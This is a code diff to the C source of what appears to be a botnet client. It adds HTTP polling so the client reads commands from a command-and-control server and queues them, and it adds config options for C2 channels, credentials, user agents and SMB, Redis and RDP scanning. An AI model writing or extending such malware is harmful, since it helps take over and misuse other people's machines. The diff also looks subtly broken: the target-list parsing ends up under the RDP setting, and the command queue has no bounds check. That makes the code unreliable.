@@ -207,6 +207,8 @@ void irc_disconnect(notnet_bot_t *bot) {
 int http_connect(notnet_bot_t *bot) {
     if (bot->c2_http.connected) return 0;
     
+    log_info("HTTP: attempting connect to %s:%d", bot->c2_http.server, bot->c2_http.port);
+    
     int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock < 0) return -1;
     
@@ -258,11 +260,14 @@ int http_connect(notnet_bot_t *bot) {
     
     bot->c2_http.sock = sock;
     bot->c2_http.connected = 1;
+    log_info("HTTP: connected to %s:%d", bot->c2_http.server, bot->c2_http.port);
     return 0;
 }
 
 int http_post(notnet_bot_t *bot, const char *data, int len) {
     if (!bot->c2_http.connected) return -1;
+    
+    log_info("HTTP: heartbeat sent (%d bytes)", len);
     
     char headers[512];
     snprintf(headers, sizeof(headers),
@@ -271,7 +276,7 @@ int http_post(notnet_bot_t *bot, const char *data, int len) {
         "Content-Type: application/json\r\n"
         "User-Agent: %s\r\n"
         "Content-Length: %d\r\n"
-        "Connection: close\r\n"
+        "Connection: keep-alive\r\n"
         "\r\n",
         bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent, len);
     
@@ -305,6 +310,38 @@ int http_get(notnet_bot_t *bot, char *buf, int len) {
     buf[total] = '\0';
     
     return total;
+}
+
+int http_read(notnet_bot_t *bot, char *buf, int len) {
+    if (!bot->c2_http.connected) return -1;
+    
+    log_info("HTTP: http_read polling fd %d...", bot->c2_http.sock);
+    
+    /* Read response from existing connection (non-blocking) */
+    fd_set fds;
+    struct timeval tv;
+    FD_ZERO(&fds);
+    FD_SET(bot->c2_http.sock, &fds);
+    tv.tv_sec = 0;
+    tv.tv_usec = 0;
+    
+    int sel_result = select(bot->c2_http.sock + 1, &fds, NULL, NULL, &tv);
+    log_info("HTTP: http_read select returned %d", sel_result);
+    if (sel_result <= 0) return 0;
+    
+    int received = recv(bot->c2_http.sock, buf, len, 0);
+    log_info("HTTP: http_read recv returned %d", received);
+    if (received <= 0) {
+        log_info("HTTP: connection closed (recv=%d)", received);
+        bot->c2_http.connected = 0;
+        close(bot->c2_http.sock);
+        bot->c2_http.sock = -1;
+        return -1;
+    }
+    
+    log_info("HTTP: received %d bytes: %.200s", received, buf);
+    buf[received] = '\0';
+    return received;
 }
 
 int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
@@ -445,7 +482,13 @@ int protocol_connect_all(notnet_bot_t *bot) {
         if (!bot->c2_irc.connected) {
             if (irc_connect(bot) == 0) {
                 irc_send(bot, "JOIN %s", bot->c2_irc.channel);
+                bot->c2_irc.joined = 0;
             }
+        } else if (!bot->c2_irc.joined && bot->c2_irc.authenticated) {
+            /* Send JOIN once after authentication */
+            irc_send(bot, "JOIN %s", bot->c2_irc.channel);
+            bot->c2_irc.joined = 1;
+            log_info("IRC: sent JOIN %s", bot->c2_irc.channel);
         }
     }
     
@@ -481,9 +524,31 @@ int protocol_process_commands(notnet_bot_t *bot) {
         }
     }
     
-    /* Check HTTP */
+    /* Check HTTP - read responses for queued commands */
     if (bot->c2_http.connected) {
-        /* Poll for commands via HTTP */
+        int result = http_read(bot, buf, sizeof(buf));
+        if (result > 0) {
+            log_info("HTTP: http_read returned %d bytes", result);
+            /* Parse JSON command from response */
+            char *cmd_key = strstr(buf, "\"cmd\"");
+            char *val_key = strstr(buf, "\"value\"");
+            if (cmd_key) {
+                char cmd[128];
+                snprintf(cmd, sizeof(cmd), "%s", cmd_key + 6);
+                /* Extract value between quotes */
+                char *start = strchr(cmd, '"');
+                char *end = start ? strchr(start + 1, '"') : NULL;
+                if (start && end && end > start) {
+                    int clen = end - start - 1;
+                    if (clen > 0 && clen < 127) {
+                        strncpy(bot->cmd_queue[bot->cmd_count], start + 1, clen);
+                        bot->cmd_queue[bot->cmd_count][clen] = '\0';
+                        bot->cmd_count++;
+                        log_info("HTTP: command: %s", bot->cmd_queue[bot->cmd_count - 1]);
+                    }
+                }
+            }
+        }
     }
     
     /* Check WebSocket */
@@ -544,6 +609,8 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
     /* Send via HTTP */
     if (bot->c2_http.connected) {
         http_post(bot, heartbeat, strlen(heartbeat));
+        /* http_read() in protocol_process_commands() will pick up
+         * the response on the next loop iteration */
     }
     
     /* Send via WebSocket */
@@ -636,7 +703,25 @@ int load_config(notnet_bot_t *bot, const char *path) {
             bot->scan_timeout_ms = atoi(value);
         } else if (strcmp(key, "scan_max_hosts") == 0) {
             bot->scan_max_hosts = atoi(value);
-        } else if (strcmp(key, "scan_targets") == 0) {
+        } else if (strcmp(key, "heartbeat_interval") == 0) {
+            if (atoi(value) > 0) bot->heartbeat_interval = atoi(value);
+        } else if (strcmp(key, "irc_channel") == 0) {
+            strncpy(bot->c2_irc.channel, value, 127);
+            log_info("IRC channel set to %s", bot->c2_irc.channel);
+        } else if (strcmp(key, "irc_pass") == 0) {
+            strncpy(bot->c2_irc.pass, value, 63);
+        } else if (strcmp(key, "http_path") == 0) {
+            strncpy(bot->c2_http.path, value, 127);
+        } else if (strcmp(key, "http_user_agent") == 0) {
+            strncpy(bot->c2_http.user_agent, value, 127);
+        } else if (strcmp(key, "ws_path") == 0) {
+            strncpy(bot->c2_ws.path, value, 127);
+        } else if (strcmp(key, "smb_enabled") == 0) {
+            bot->smb_enabled = atoi(value);
+        } else if (strcmp(key, "redis_enabled") == 0) {
+            bot->redis_enabled = atoi(value);
+        } else if (strcmp(key, "rdp_enabled") == 0) {
+            bot->rdp_enabled = atoi(value);
             /* Format: "192.168.1.0/24,10.0.0.0/24" or one per line with prefix "scan_target_X" */
             if (bot->scan_target_count < 16) {
                 strncpy(bot->scan_targets[bot->scan_target_count], value, 255);
